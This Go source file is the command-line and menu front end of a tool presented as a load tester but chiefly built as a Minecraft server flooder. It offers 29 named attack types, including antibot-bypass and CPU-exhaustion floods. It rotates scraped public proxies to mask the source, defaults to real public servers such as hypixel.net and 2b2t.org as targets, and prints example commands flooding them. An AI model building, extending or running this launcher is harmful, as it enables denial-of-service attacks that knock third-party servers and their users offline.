package main

import (
	"flag"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"loadtest/utils"
)

// Styles
var (
	titleStyle = lipgloss.NewStyle().
			Bold(true).
			Foreground(lipgloss.Color("#7D56F4")).
			MarginBottom(1)

	selectedStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#7D56F4")).
			Bold(true)

	normalStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FFFFFF"))

	infoStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#00BFFF"))

	promptStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("#FFD700"))

	helpStyle = lipgloss.NewStyle().
			Faint(true).
			Foreground(lipgloss.Color("#666666"))
)

type screen int

const (
	modeSelection screen = iota
	minecraftFloodTypeSelection
	minecraftServerConfig
	proxyConfig
	proxyInput
	workerConfig
	rpsConfig
	durationConfig
	loadTestServerConfig
	running
)

type model struct {
	screen      screen
	cursor      int
	choices     []string
	mode        string
	servers     []string
	workers     int
	rps         int
	duration    time.Duration
	floodType   string
	proxies     []ProxyConfig
	useRotating bool
	input       string
	inputMode   bool
	err         error
	quitting    bool
	proxyBuffer []string
	width       int
	height      int
}

func initialModel() model {
	return model{
		screen:      modeSelection,
		choices:     []string{"Normaler Load-Test", "Minecraft Server Flooder"},
		workers:     10,
		rps:         50,
		duration:    30 * time.Second,
		useRotating: true,
		proxyBuffer: []string{},
		width:       80,
		height:      24,
	}
}

func (m model) Init() tea.Cmd {
	return nil
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height

	case tea.KeyMsg:
		if m.inputMode {
			return m.handleInput(msg)
		}

		switch msg.String() {
		case "ctrl+c":
			m.quitting = true
			return m, tea.Quit

		case "up", "k":
			if m.cursor > 0 {
				m.cursor--
			}

		case "down", "j":
			if m.cursor < len(m.choices)-1 {
				m.cursor++
			}

		case "enter":
			return m.handleEnter()
		}
	}

	return m, nil
}

func (m model) handleInput(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch msg.String() {
	case "enter":
		if m.screen == proxyInput {
			m.proxyBuffer = append(m.proxyBuffer, m.input)
			m.input = ""
			return m, nil
		}
		m.inputMode = false
		return m.processInput()
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit
	case "ctrl+v", "ctrl+shift+v":
		return m, nil
	case "backspace":
		if len(m.input) > 0 {
			m.input = m.input[:len(m.input)-1]
		}
	case "esc":
		if m.screen == proxyInput && len(m.proxyBuffer) > 0 {
			// Proxy-Eingabe abschließen
			m.inputMode = false
			m.input = ""
			return m.processProxyInput()
		}
		m.inputMode = false
		m.input = ""
	default:
		if len(msg.String()) == 1 {
			m.input += msg.String()
		}
	}
	return m, nil
}

func (m model) processProxyInput() (tea.Model, tea.Cmd) {
	if len(m.proxyBuffer) == 0 {
		m.screen = workerConfig
		m.inputMode = true
		m.input = ""
		return m, nil
	}

	// Parse Proxy-Liste
	proxyText := strings.Join(m.proxyBuffer, "\n")
	parsedProxies, err := parseProxyList(proxyText)
	if err != nil {
		utils.Warning("Fehler beim Parsen der Proxy-Liste: %v", err)
	} else {
		m.proxies = append(m.proxies, parsedProxies...)
		utils.Info("%d Proxys erfolgreich hinzugefügt", len(parsedProxies))
	}

	m.proxyBuffer = []string{}
	m.screen = workerConfig
	m.inputMode = true
	m.input = ""
	return m, nil
}

func (m model) processInput() (tea.Model, tea.Cmd) {
	switch m.screen {
	case minecraftServerConfig:
		if m.input != "" {
			m.servers = strings.Split(m.input, ",")
			for i := range m.servers {
				m.servers[i] = strings.TrimSpace(m.servers[i])
			}
		} else {
			m.servers = []string{"hypixel.net", "mc.hypixel.net", "2b2t.org", "mineplex.com", "gommehd.net", "cubecraft.net"}
		}
		m.input = ""
		m.screen = proxyConfig
		m.choices = []string{"Keine Proxies", "ProxyScrape SOCKS5", "ProxyScrape HTTP", "ProxyScrape ALL", "Datei laden", "Manuelle Eingabe"}
		m.cursor = 0

	case loadTestServerConfig:
		if m.input != "" {
			m.servers = []string{m.input}
		} else {
			m.servers = []string{"example.com:80"}
		}
		m.input = ""
		m.screen = proxyConfig
		m.choices = []string{"Keine Proxies", "ProxyScrape SOCKS5", "ProxyScrape HTTP", "ProxyScrape ALL", "Datei laden", "Manuelle Eingabe"}
		m.cursor = 0

	case workerConfig:
		if m.input != "" {
			if w, err := strconv.Atoi(m.input); err == nil && w > 0 {
				m.workers = w
			}
		}
		m.input = ""
		m.screen = rpsConfig
		m.inputMode = true

	case rpsConfig:
		if m.input != "" {
			if r, err := strconv.Atoi(m.input); err == nil && r > 0 {
				m.rps = r
			}
		}
		m.input = ""
		m.screen = durationConfig
		m.inputMode = true

	case durationConfig:
		if m.input != "" {
			if d, err := strconv.Atoi(m.input); err == nil && d > 0 {
				m.duration = time.Duration(d) * time.Second
			}
		}
		m.input = ""
		return m.startTest()
	}

	return m, nil
}

func (m model) handleEnter() (tea.Model, tea.Cmd) {
	switch m.screen {
	case modeSelection:
		switch m.cursor {
		case 0:
			m.mode = "loadtest"
			m.screen = loadTestServerConfig
			m.inputMode = true
			m.input = ""
		case 1:
			m.mode = "minecraft"
			m.screen = minecraftFloodTypeSelection
			m.choices = getFloodTypeChoices()
			m.cursor = 0
		}

	case minecraftFloodTypeSelection:
		m.floodType = getFloodTypeFromIndex(m.cursor)
		m.screen = minecraftServerConfig
		m.inputMode = true
		m.input = ""

	case minecraftServerConfig:
		return m.processInput()

	case proxyConfig:
		switch m.cursor {
		case 0:
			m.proxies = []ProxyConfig{}
			m.screen = workerConfig
			m.inputMode = true
			m.input = ""
		case 1:
			m.proxies = loadProxiesFromProxyScrape("socks5")
			m.screen = workerConfig
			m.inputMode = true
			m.input = ""
		case 2:
			m.proxies = loadProxiesFromProxyScrape("http")
			m.screen = workerConfig
			m.inputMode = true
			m.input = ""
		case 3:
			m.proxies = loadProxiesFromProxyScrape("all")
			m.screen = workerConfig
			m.inputMode = true
			m.input = ""
		case 4:
			// Datei laden
			m.screen = workerConfig
			m.inputMode = true
			m.input = ""
		case 5:
			// Manuelle Eingabe
			m.screen = proxyInput
			m.inputMode = true
			m.input = ""
			m.proxyBuffer = []string{}
		}
	}

	return m, nil
}

func (m model) startTest() (tea.Model, tea.Cmd) {
	m.screen = running

	if m.mode == "minecraft" {
		go func() {
			flooder := NewMinecraftFlooder(m.servers, m.proxies, m.useRotating, m.workers, m.duration, m.floodType)
			utils.StartWithErrorHandling(flooder)
		}()
	} else {
		go func() {
			tester, err := NewLoadTester(m.servers[0], m.workers, m.rps, m.duration)
			if err != nil {
				utils.Error("Fehler beim Erstellen des Load Testers: %v", err)
				return
			}
			tester.useRotating = m.useRotating
			for _, p := range m.proxies {
				_ = tester.AddProxy(p.Protocol, p.Host, p.Port, p.Username, p.Password, "")
			}
			tester.Start()
		}()
	}

	time.Sleep(2 * time.Second)
	return m, tea.Quit
}

func centerText(text string, width int) string {
	if width <= 0 {
		width = 80
	}
	textWidth := len(text)
	if textWidth >= width {
		return text
	}
	padding := (width - textWidth) / 2
	return strings.Repeat(" ", padding) + text
}

func (m model) View() string {
	if m.quitting {
		return centerText("Auf Wiedersehen!", m.width) + "\n"
	}

	var s strings.Builder

	switch m.screen {
	case modeSelection:
		s.WriteString(centerText(titleStyle.Render("SERVER LASTTEST & MINECRAFT PINGER"), m.width))
		s.WriteString("\n\n")
		s.WriteString(centerText(titleStyle.Render("TEST MODUS AUSWAHL"), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(strings.Repeat("=", 30), m.width))
		s.WriteString("\n\n")

		for i, choice := range m.choices {
			cursor := " "
			if m.cursor == i {
				cursor = ">"
				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, selectedStyle.Render(choice)), m.width))
			} else {
				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, normalStyle.Render(choice)), m.width))
			}
			s.WriteString("\n")
		}

	case minecraftFloodTypeSelection:
		s.WriteString(centerText(titleStyle.Render("FLOOD-TYP AUSWAHL"), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(strings.Repeat("-", 30), m.width))
		s.WriteString("\n\n")

		for i, choice := range m.choices {
			cursor := " "
			if m.cursor == i {
				cursor = ">"
				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, selectedStyle.Render(choice)), m.width))
			} else {
				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, normalStyle.Render(choice)), m.width))
			}
			s.WriteString("\n")
		}

	case minecraftServerConfig:
		s.WriteString(centerText(titleStyle.Render("SERVER KONFIGURATION"), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(strings.Repeat("-", 30), m.width))
		s.WriteString("\n\n")
		s.WriteString(centerText(promptStyle.Render("Server eingeben (kommasepariert) [Standard Server]: "), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(m.input, m.width))

	case loadTestServerConfig:
		s.WriteString(centerText(titleStyle.Render("SERVER KONFIGURATION"), m.width))
		s.WriteString("\n\n")
		s.WriteString(centerText(promptStyle.Render("Zielserver (host:port) [example.com:80]: "), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(m.input, m.width))

	case proxyConfig:
		s.WriteString(centerText(titleStyle.Render("PROXY KONFIGURATION"), m.width))
		s.WriteString("\n\n")

		for i, choice := range m.choices {
			cursor := " "
			if m.cursor == i {
				cursor = ">"
				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, selectedStyle.Render(choice)), m.width))
			} else {
				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, normalStyle.Render(choice)), m.width))
			}
			s.WriteString("\n")
		}

	case proxyInput:
		s.WriteString(centerText(titleStyle.Render("PROXY EINGABE"), m.width))
		s.WriteString("\n\n")
		s.WriteString(centerText(promptStyle.Render("Proxys eingeben (ein Proxy pro Enter):"), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(infoStyle.Render("Format: protocol://host:port oder host:port"), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(infoStyle.Render("Mit Auth: protocol://user:pass@host:port"), m.width))
		s.WriteString("\n\n")

		if len(m.proxyBuffer) > 0 {
			s.WriteString(centerText(fmt.Sprintf("Eingegebene Proxys: %d", len(m.proxyBuffer)), m.width))
			s.WriteString("\n\n")
		}

		s.WriteString(centerText("> "+m.input, m.width))

	case workerConfig:
		s.WriteString(centerText(titleStyle.Render("WORKER KONFIGURATION"), m.width))
		s.WriteString("\n\n")
		s.WriteString(centerText(promptStyle.Render(fmt.Sprintf("Anzahl Worker [%d]: ", m.workers)), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(m.input, m.width))

	case rpsConfig:
		s.WriteString(centerText(titleStyle.Render("RPS KONFIGURATION"), m.width))
		s.WriteString("\n\n")
		if m.mode == "minecraft" {
			s.WriteString(centerText(promptStyle.Render(fmt.Sprintf("Floods pro Sekunde [%d]: ", m.rps)), m.width))
		} else {
			s.WriteString(centerText(promptStyle.Render(fmt.Sprintf("Requests pro Sekunde [%d]: ", m.rps)), m.width))
		}
		s.WriteString("\n")
		s.WriteString(centerText(m.input, m.width))

	case durationConfig:
		s.WriteString(centerText(titleStyle.Render("DAUER KONFIGURATION"), m.width))
		s.WriteString("\n\n")
		s.WriteString(centerText(promptStyle.Render(fmt.Sprintf("Testdauer in Sekunden [%d]: ", int(m.duration.Seconds()))), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(m.input, m.width))

	case running:
		s.WriteString(centerText(titleStyle.Render("TEST LÄUFT"), m.width))
		s.WriteString("\n\n")
		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Modus: %s", m.mode)), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Server: %d", len(m.servers))), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Worker: %d", m.workers)), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("RPS: %d", m.rps)), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Dauer: %v", m.duration)), m.width))
		s.WriteString("\n")
		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Proxys: %d", len(m.proxies))), m.width))
		s.WriteString("\n")
		if m.mode == "minecraft" {
			s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Flood-Typ: %s", m.floodType)), m.width))
			s.WriteString("\n")
		}
	}

	s.WriteString("\n")
	if m.inputMode {
		if m.screen == proxyInput {
			s.WriteString(centerText(helpStyle.Render("(ESC: Fertig • Enter: Proxy hinzufügen • Ctrl+V: Einfügen • Ctrl+C: Beenden)"), m.width))
		} else {
			s.WriteString(centerText(helpStyle.Render("(ESC: Abbrechen • Enter: Bestätigen • Ctrl+V: Einfügen • Ctrl+C: Beenden)"), m.width))
		}
	} else {
		s.WriteString(centerText(helpStyle.Render("(↑/↓: Navigation • Enter: Auswählen • q: Beenden)"), m.width))
	}
	s.WriteString("\n")

	return s.String()
}

func getFloodTypeChoices() []string {
	return []string{
		"1. Localhost Attack", "2. Name Null Ping", "3. Boss Handler", "4. Fake Premium Join",
		"5. Bot Null Ping", "6. Ultra Join", "7. UFO Attack", "8. nAntibot",
		"9. 2LS Bypass", "10. Multi Killer", "11. Aegis Killer", "12. CPU Lagger",
		"13. Destroyer", "14. ID Error", "15. Fake Host", "16. Pro Auth Killer",
		"17. Standard Flood", "18. Join Bots", "19. Bot Fucker", "20. Consola",
		"21. Paola", "22. TimeOut Killer", "23. CPU Burner 6", "24. CPU Ripper",
		"25. Fake Join", "26. Fast Join", "27. MOTD Killer", "28. Legacy MOTD", "29. Byte Attack",
	}
}

func getFloodTypeFromIndex(i int) string {
	types := []string{
		"localhost", "namenullping", "bosshandler", "fakepremium_join",
		"botnullping", "ultrajoin", "ufo", "nAntibot",
		"2lsbypass", "multikiller", "aegiskiller", "cpulagger",
		"destroyer", "IDERROR", "fakehost", "proauthkiller",
		"flood", "joinbots", "botfucker", "consola",
		"paola", "TimeOutKiller", "cpuburner6", "cpuRipper",
		"fakejoin", "fastjoin", "motdkiller", "legacy_motd", "byte",
	}
	if i < len(types) {
		return types[i]
	}
	return "ultrajoin"
}

func main() {
	var (
		mode            = flag.String("mode", "", "Test-Modus: 'loadtest' oder 'minecraft'")
		servers         = flag.String("servers", "", "Zielserver (kommasepariert)")
		workers         = flag.Int("workers", 0, "Anzahl Worker")
		rps             = flag.Int("rps", 0, "Requests/Floods pro Sekunde")
		duration        = flag.Int("duration", 0, "Testdauer in Sekunden")
		floodType       = flag.String("flood-type", "", "Minecraft Flood-Typ")
		proxyFile       = flag.String("proxy-file", "", "Pfad zur Proxy-Datei")
		proxyList       = flag.String("proxy-list", "", "Proxy-Liste (kommasepariert)")
		proxyProtocol   = flag.String("proxy-protocol", "socks5", "Proxy-Protokoll")
		useRotating     = flag.Bool("rotating", true, "Rotating Proxys verwenden")
		testProxies     = flag.Bool("test-proxies", false, "Proxys testen")
		proxyScrape     = flag.Bool("proxy-scrape", false, "Proxys von ProxyScrape laden")
		proxyScrapeType = flag.String("proxy-scrape-type", "all", "ProxyScrape Typ")
		debugLog        = flag.Bool("debug", false, "Debug-Logging aktivieren")
		fileLog         = flag.Bool("log-file", false, "Logging in Datei")
		help            = flag.Bool("help", false, "Hilfe anzeigen")
	)

	flag.Parse()

	logLevel := utils.LogLevelInfo
	if *debugLog {
		logLevel = utils.LogLevelDebug
	}

	utils.SetGlobalLogLevel(logLevel)
	if *fileLog {
		_ = utils.EnableGlobalFileLogging("logs")
	}

	if *help {
		printUsage()
		return
	}

	if *mode != "" {
		runWithCommandLine(*mode, *servers, *workers, *rps, *duration, *floodType,
			*proxyFile, *proxyList, *proxyProtocol, *useRotating, *testProxies,
			*proxyScrape, *proxyScrapeType, *debugLog, *fileLog)
		return
	}

	p := tea.NewProgram(initialModel(), tea.WithAltScreen())
	if _, err := p.Run(); err != nil {
		fmt.Printf("Fehler: %v\n", err)
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Println("SERVER LASTTEST & MINECRAFT PINGER - Command Line Usage")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Println()
	fmt.Println("BEISPIELE:")
	fmt.Println()
	fmt.Println("1. Minecraft Server Flooder:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net,2b2t.org\" -workers=50 -rps=100 -duration=60 -flood-type=ultrajoin")
	fmt.Println()
	fmt.Println("2. Mit Proxy-Datei:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=20 -rps=50 -duration=30 -flood-type=motdkiller -proxy-file=\"proxies.txt\"")
	fmt.Println()
	fmt.Println("3. Mit ProxyScrape:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"gommehd.net\" -workers=30 -rps=75 -duration=45 -flood-type=cpulagger -proxy-scrape -proxy-scrape-type=socks5")
	fmt.Println()
	fmt.Println("4. Mit manueller Proxy-Liste:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=15 -rps=25 -duration=20 -flood-type=fakejoin -proxy-list=\"proxy1.com:1080,proxy2.com:1080\"")
	fmt.Println()
	fmt.Println("5. Load-Test:")
	fmt.Println("   ./flooder -mode=loadtest -servers=\"example.com:80\" -workers=100 -rps=200 -duration=30")
	fmt.Println()
	fmt.Println("FLAGS:")
	flag.PrintDefaults()
}

func runWithCommandLine(mode, serverList string, workers, rpsVal, durationVal int,
	floodTypeVal, proxyFile, proxyList, proxyProtocol string, useRotatingProxies,
	testProxiesFlag, proxyScrapeFlag bool, proxyScrapeType string, debug, fileLog bool) {

	if serverList == "" {
		utils.Fatal("Fehler: Server müssen angegeben werden (-servers)")
	}

	if workers <= 0 {
		workers = 10
		utils.Info("Keine Worker angegeben, verwende Standardwert: %d", workers)
	}

	if rpsVal <= 0 {
		rpsVal = 50
		utils.Info("Keine RPS angegeben, verwende Standardwert: %d", rpsVal)
	}

	if durationVal <= 0 {
		durationVal = 30
		utils.Info("Keine Dauer angegeben, verwende Standardwert: %d Sekunden", durationVal)
	}

	var proxies []ProxyConfig

	if proxyScrapeFlag {
		utils.Info("Lade Proxys von ProxyScrape (%s)...", proxyScrapeType)
		proxies = loadProxiesFromProxyScrape(proxyScrapeType)
		utils.Info("%d Proxys geladen", len(proxies))
	} else if proxyFile != "" {
		utils.Info("Lade Proxys aus Datei: %s", proxyFile)
		var err error
		proxies, err = loadProxiesFromFile(proxyFile)
		if err != nil {
			utils.Fatal("Fehler beim Laden der Proxy-Datei: %v", err)
		}
		for i := range proxies {
			if proxies[i].Protocol == "" {
				proxies[i].Protocol = proxyProtocol
			}
		}
		utils.Info("%d Proxys geladen", len(proxies))
	} else if proxyList != "" {
		utils.Info("Parse manuelle Proxy-Liste...")
		proxies = parseCommandLineProxyList(proxyList, proxyProtocol)
		utils.Info("%d Proxys geparst", len(proxies))
	}

	if testProxiesFlag && len(proxies) > 0 {
		utils.Info("Teste %d Proxys...", len(proxies))
		working, _, _ := testProxiesParallel(proxies, 50)
		utils.Info("%d von %d Proxys funktionieren", len(working), len(proxies))
		proxies = working
	}

	duration := time.Duration(durationVal) * time.Second

	if mode == "minecraft" {
		runMinecraftFlooderCommandLine(serverList, workers, rpsVal, duration,
			floodTypeVal, proxies, useRotatingProxies)
	} else if mode == "loadtest" {
		runLoadTestCommandLine(serverList, workers, rpsVal, duration,
			proxies, useRotatingProxies)
	} else {
		utils.Fatal("Ungültiger Modus: %s (verwende 'loadtest' oder 'minecraft')", mode)
	}
}

func parseCommandLineProxyList(proxyList, protocol string) []ProxyConfig {
	var proxies []ProxyConfig
	proxyEntries := strings.Split(proxyList, ",")
	for _, entry := range proxyEntries {
		entry = strings.TrimSpace(entry)
		if entry == "" {
			continue
		}
		if strings.Contains(entry, "://") {
			parsed, err := parseProxyList(entry)
			if err == nil && len(parsed) > 0 {
				proxies = append(proxies, parsed...)
			}
		} else {
			parts := strings.Split(entry, ":")
			if len(parts) >= 2 {
				proxies = append(proxies, ProxyConfig{
					Host:     parts[0],
					Port:     parts[1],
					Protocol: protocol,
					Type:     "rotating",
				})
			}
		}
	}
	return proxies
}

func loadProxiesFromProxyScrape(scrapeType string) []ProxyConfig {
	var apiURL string
	var preferredProtocol string

	switch scrapeType {
	case "socks5":
		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
		preferredProtocol = "socks5"
	case "http":
		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
		preferredProtocol = "http"
	default:
		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
	}

	proxies, err := downloadProxiesFromAPI(apiURL, preferredProtocol)
	if err != nil {
		utils.Error("ProxyScrape Download fehlgeschlagen: %v", err)
		return []ProxyConfig{}
	}

	return proxies
}

func runMinecraftFlooderCommandLine(serverList string, workers, rps int,
	duration time.Duration, floodTypeVal string, proxies []ProxyConfig, useRotating bool) {

	servers := strings.Split(serverList, ",")
	for i := range servers {
		servers[i] = strings.TrimSpace(servers[i])
	}

	if floodTypeVal == "" {
		floodTypeVal = "ultrajoin"
		utils.Info("Kein Flood-Typ angegeben, verwende: %s", floodTypeVal)
	}

	utils.Info("Starte Minecraft Server Flooder...")
	utils.Info("Server: %d, Worker: %d, Floods/s: %d, Dauer: %v, Typ: %s",
		len(servers), workers, rps, duration, floodTypeVal)
	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)

	flooder := NewMinecraftFlooder(servers, proxies, useRotating, workers, duration, floodTypeVal)
	utils.StartWithErrorHandling(flooder)
}

func runLoadTestCommandLine(serverList string, workers, rps int,
	duration time.Duration, proxies []ProxyConfig, useRotating bool) {

	servers := strings.Split(serverList, ",")
	if len(servers) > 1 {
		utils.Warning("Load-Test unterstützt nur einen Server. Verwende: %s", servers[0])
	}

	targetServer := strings.TrimSpace(servers[0])

	tester, err := NewLoadTester(targetServer, workers, rps, duration)
	if err != nil {
		utils.Fatal("Fehler beim Erstellen des Load Testers: %v", err)
	}

	tester.useRotating = useRotating

	if len(proxies) > 0 {
		var addErrors []string
		for _, p := range proxies {
			err := tester.AddProxy(p.Protocol, p.Host, p.Port, p.Username, p.Password, "")
			if err != nil {
				addErrors = append(addErrors, fmt.Sprintf("%s:%s - %v", p.Host, p.Port, err))
			}
		}

		if len(addErrors) > 0 && len(addErrors) < 10 {
			utils.Warning("Proxy-Fehler:")
			for _, errMsg := range addErrors {
				utils.Warning("  %s", errMsg)
			}
		}

		if len(tester.proxies) == 0 {
			utils.Warning("Keine gültigen Proxys verfügbar - verwende direkte Verbindung")
		}
	}

	utils.Info("Starte Load-Test...")
	utils.Info("Server: %s, Worker: %d, RPS: %d, Dauer: %v",
		targetServer, workers, rps, duration)
	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)

	tester.Start()
}
